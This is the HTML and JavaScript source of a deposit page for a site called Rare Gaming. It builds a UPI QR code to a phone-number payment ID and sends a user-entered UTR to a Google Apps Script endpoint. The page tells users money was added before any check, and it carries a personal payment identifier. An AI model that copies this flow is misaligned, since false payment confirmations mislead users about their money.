<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Deposit - Rare Gaming</title>
    <style>
        /* Exact Ditto Background */
        body {
            background: linear-gradient(to bottom, #1b103c, #a1368b);
            font-family: sans-serif;
            color: white;
            margin: 0;
            padding: 0;
            height: 100vh;
        }

        .container {
            padding: 20px;
            max-width: 400px;
            margin: 0 auto;
        }

        /* Top Header */
        .header {
            display: flex;
            align-items: center;
            margin-bottom: 30px;
        }
        .back-btn {
            background: none;
            border: none;
            color: white;
            font-size: 20px;
            cursor: pointer;
            margin-right: 15px;
        }

        /* Step 1 Styling */
        .input-box {
            background: transparent;
            border: 1px solid #4a3b75;
            border-radius: 8px;
            width: 100%;
            padding: 15px;
            font-size: 20px;
            color: white;
            box-sizing: border-box;
            margin-bottom: 20px;
            outline: none;
        }

        .grid-container {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 10px;
            margin-bottom: 40px;
        }

        .amount-btn {
            background-color: #1a153a;
            border: none;
            color: white;
            padding: 12px 0;
            border-radius: 8px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
        }

        .continue-btn {
            background: linear-gradient(90deg, #1b3266, #2d559e);
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 30px;
            color: white;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
        }

        /* QR & UTR Section */
        #step2 {
            background: white;
            color: black;
            padding: 20px;
            border-radius: 15px;
            text-align: center;
            margin-top: 20px;
        }

        .paid-btn {
            background: #28a745;
            color: white;
            width: 100%;
            padding: 15px;
            margin-top: 15px;
            border: none;
            border-radius: 30px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }

        .utr-input {
            width: 90%;
            padding: 12px;
            margin-top: 15px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            text-align: center;
        }

        .verify-btn {
            background: #4caf50;
            color: white;
            width: 90%;
            padding: 12px;
            margin-top: 15px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="container">
        
        <div class="header">
            <button class="back-btn" onclick="window.location.href='earn.html'">←</button>
            <h2 style="margin: 0; font-size: 20px; font-weight: normal; margin-left: 20px;">Deposit</h2>
        </div>

        <div id="step1">
            <p style="font-weight: bold; margin-bottom: 10px;">Amount to Deposit</p>
            <input type="number" id="payAmount" class="input-box" placeholder="Enter Amount">

            <div class="grid-container">
                <button class="amount-btn" onclick="setAmount(20)">20</button>
                <button class="amount-btn" onclick="setAmount(50)">50</button>
                <button class="amount-btn" onclick="setAmount(70)">70</button>
                <button class="amount-btn" onclick="setAmount(100)">100</button>
                <button class="amount-btn" onclick="setAmount(200)">200</button>
                <button class="amount-btn" onclick="setAmount(500)">500</button>
                <button class="amount-btn" onclick="setAmount(1000)">1000</button>
                <button class="amount-btn" onclick="setAmount(2000)">2000</button>
            </div>

            <button class="continue-btn" onclick="generateQR()">Continue</button>
        </div>

        <div id="step2" style="display: none;">
            <h2 style="margin-top: 0; font-size: 20px; color: #333;">RareGaming</h2>
            <p style="font-size: 14px; font-weight: bold;">Scan & Pay With Any App</p>
            <p style="font-size: 14px; color: #555;">You are transferring ₹<span id="displayAmount"></span></p>
            
            <img id="qrImage" src="" alt="Loading QR..." style="width: 220px; height: 220px; margin: 15px 0; border: 2px solid #eee;">
            
            <p style="color: #d9534f; font-weight: bold;">Expire in <span id="timer">05:00</span></p>

            <button id="iHavePaidBtn" class="paid-btn" onclick="showUtrBox()">I Have Paid ✅</button>

            <div id="utrSection" style="display: none;">
                <hr style="border: 0; border-top: 1px solid #ddd; margin: 15px 0;">
                <p style="font-size: 12px; color: #777;">Enter your 12-digit UTR below for instant credit:</p>
                <input type="number" id="utrNumber" class="utr-input" placeholder="Enter UTR Number">
                <button class="verify-btn" onclick="submitPayment()">Submit & Add Money</button>
            </div>
        </div>

    </div>

    <script>
        let timerInterval;
        const scriptURL = "https://script.google.com/macros/s/AKfycbwZQtuhgqNw0VrGBG1fA0-GSGC4Fmeyvi8Fo2xL0F8ngBjmaGNrrbtB88g_J9xu7vnQKw/exec";

        function setAmount(val) {
            document.getElementById('payAmount').value = val;
        }

        function generateQR() {
            let amount = document.getElementById('payAmount').value;
            if(amount < 5) { alert("Min ₹5"); return; }

            let upiId = "8328875119-3@ybl"; 
            let upiLink = `upi://pay?pa=${upiId}&pn=RareGaming&am=${amount}&cu=INR`;
            let qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(upiLink)}`;
            
            document.getElementById('qrImage').src = qrUrl;
            document.getElementById('displayAmount').innerText = amount;
            document.getElementById('step1').style.display = 'none';
            document.getElementById('step2').style.display = 'block';
            
            startTimer(300);
        }

        function startTimer(duration) {
            clearInterval(timerInterval);
            let timer = duration, min, sec;
            timerInterval = setInterval(() => {
                min = parseInt(timer / 60, 10);
                sec = parseInt(timer % 60, 10);
                document.getElementById('timer').textContent = (min<10?"0":"") + min + ":" + (sec<10?"0":"") + sec;
                if (--timer < 0) { location.reload(); }
            }, 1000);
        }

        function showUtrBox() {
            document.getElementById('iHavePaidBtn').style.display = 'none';
            document.getElementById('utrSection').style.display = 'block';
        }

        async function submitPayment() {
            let utr = document.getElementById('utrNumber').value;
            let amount = document.getElementById('payAmount').value;
            let userStr = localStorage.getItem("rareGamingUser");
            if (!userStr) return alert("Login First");
            
            let userData = JSON.parse(userStr);
            if(utr.length !== 12) return alert("Enter 12-digit UTR");

            alert("Verifying... Please wait.");
            try {
                await fetch(scriptURL, {
                    method: 'POST',
                    body: new URLSearchParams({
                        'action': 'submitUTR',
                        'playerName': userData.name,
                        'uid': userData.uid,
                        'amount': amount,
                        'utr': utr
                    })
                });
                alert("Success! Money added to wallet.");
                window.location.href = 'earn.html';
            } catch (e) {
                alert("Submit error!");
            }
        }
    </script>
</body>
</html>
